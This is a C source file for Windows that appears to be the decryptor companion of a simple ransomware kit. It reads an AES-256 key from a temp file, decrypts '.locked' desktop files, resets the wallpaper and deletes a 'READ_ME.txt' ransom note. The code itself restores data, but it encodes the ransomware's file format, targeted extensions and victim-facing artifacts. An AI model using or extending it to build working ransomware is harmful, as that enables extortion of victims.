#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <shlobj.h>

#define AES_BLOCK_SIZE 16

// Whitelist of file extensions to target (must match the encryptor)
const char *whitelisted_extensions[] = {
    ".doc.locked", ".docx.locked", ".xls.locked", ".xlsx.locked", 
    ".ppt.locked", ".pptx.locked", ".pdf.locked", ".txt.locked", 
    ".jpg.locked", ".jpeg.locked", ".png.locked", ".csv.locked", 
    ".zip.locked", ".rar.locked", ".mp3.locked", ".mp4.locked", 
    ".mov.locked", ".avi.locked"
};
const int num_extensions = sizeof(whitelisted_extensions) / sizeof(whitelisted_extensions[0]);

// Function to check if file has a locked extension
int is_locked_file(const char *filename) {
    for (int i = 0; i < num_extensions; i++) {
        size_t ext_len = strlen(whitelisted_extensions[i]);
        size_t filename_len = strlen(filename);
        
        if (filename_len >= ext_len && 
            _stricmp(filename + filename_len - ext_len, whitelisted_extensions[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

// Function to read the encryption key from temp file
int read_key(unsigned char *key, int key_len) {
    char temp_path[MAX_PATH];
    char key_file_path[MAX_PATH];
    
    // Get temp directory path
    if (GetTempPathA(MAX_PATH, temp_path) == 0) {
        MessageBox(NULL, "Error getting temp path!", "Error", MB_ICONERROR);
        return 0;
    }
    
    snprintf(key_file_path, MAX_PATH, "%sransom_key.bin", temp_path);

    // Read key in binary format
    FILE *key_file = fopen(key_file_path, "rb");
    if (!key_file) {
        MessageBox(NULL, "Error opening key file!", "Error", MB_ICONERROR);
        return 0;
    }
    
    size_t bytes_read = fread(key, 1, key_len, key_file);
    fclose(key_file);
    
    if (bytes_read != key_len) {
        MessageBox(NULL, "Error reading key data!", "Error", MB_ICONERROR);
        return 0;
    }
    
    return 1;
}

// Function to decrypt files using AES-256
void decrypt_file(const char *filename, unsigned char *key) {
    // Skip files that don't have the .locked extension
    if (!is_locked_file(filename)) {
        return;
    }
    
    FILE *input = fopen(filename, "rb");
    if (!input) return;
    
    // Read IV from the beginning of the file
    unsigned char iv[AES_BLOCK_SIZE];
    if (fread(iv, 1, AES_BLOCK_SIZE, input) != AES_BLOCK_SIZE) {
        fclose(input);
        return;
    }
    
    // Determine encrypted file size
    fseek(input, 0, SEEK_END);
    long file_size = ftell(input);
    fseek(input, AES_BLOCK_SIZE, SEEK_SET);
    
    // Read encrypted content into memory
    long encrypted_size = file_size - AES_BLOCK_SIZE;
    unsigned char *encrypted_buffer = (unsigned char *)malloc(encrypted_size);
    if (!encrypted_buffer) {
        fclose(input);
        return;
    }
    
    if (fread(encrypted_buffer, 1, encrypted_size, input) != encrypted_size) {
        free(encrypted_buffer);
        fclose(input);
        return;
    }
    
    fclose(input);
    
    // Allocate memory for decrypted content
    unsigned char *decrypted_buffer = (unsigned char *)malloc(encrypted_size);
    if (!decrypted_buffer) {
        free(encrypted_buffer);
        return;
    }
    
    // Decrypt the file content
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    
    int outlen1 = 0, outlen2 = 0;
    EVP_DecryptUpdate(ctx, decrypted_buffer, &outlen1, encrypted_buffer, encrypted_size);
    EVP_DecryptFinal_ex(ctx, decrypted_buffer + outlen1, &outlen2);
    
    int total_len = outlen1 + outlen2;
    
    EVP_CIPHER_CTX_free(ctx);
    free(encrypted_buffer);
    
    // Create the original filename without .locked extension
    char original_filename[MAX_PATH];
    strncpy(original_filename, filename, MAX_PATH - 1);
    original_filename[MAX_PATH - 1] = '\0';
    
    char *dot_locked = strstr(original_filename, ".locked");
    if (dot_locked) {
        *dot_locked = '\0';  // Remove .locked extension
    }
    
    // Overwrite the encrypted file with decrypted content
    FILE *output = fopen(filename, "wb");
    if (!output) {
        free(decrypted_buffer);
        return;
    }
    
    fwrite(decrypted_buffer, 1, total_len, output);
    fclose(output);
    free(decrypted_buffer);
    
    // Rename the file back to its original name
    MoveFileA(filename, original_filename);
}

// Function to traverse directories and decrypt files
void decrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directory);

    HANDLE hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", directory, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decrypt_directory(full_path, key);
        } else {
            decrypt_file(full_path, key);
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
}

// Function to restore the default wallpaper
void restore_wallpaper() {
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

int main() {
    // Read the encryption key from temp directory
    unsigned char aes_key[32];
    if (!read_key(aes_key, 32)) {
        MessageBox(NULL, "Could not read decryption key!", "Error", MB_ICONERROR);
        return 1;
    }

    // Get the desktop path
    char desktop_path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) != S_OK) {
        MessageBox(NULL, "Error getting desktop path!", "Error", MB_ICONERROR);
        return 1;
    }

    // Decrypt files on the desktop
    decrypt_directory(desktop_path, aes_key);

    // Restore default wallpaper
    restore_wallpaper();

    // Remove the ransom note
    char ransom_note_path[MAX_PATH];
    snprintf(ransom_note_path, MAX_PATH, "%s\\READ_ME.txt", desktop_path);
    remove(ransom_note_path);

    // Inform user that decryption is complete
    MessageBox(NULL, "Decryption complete! Your files have been restored.", 
               "Decryption Successful", MB_OK | MB_ICONINFORMATION);

    return 0;
}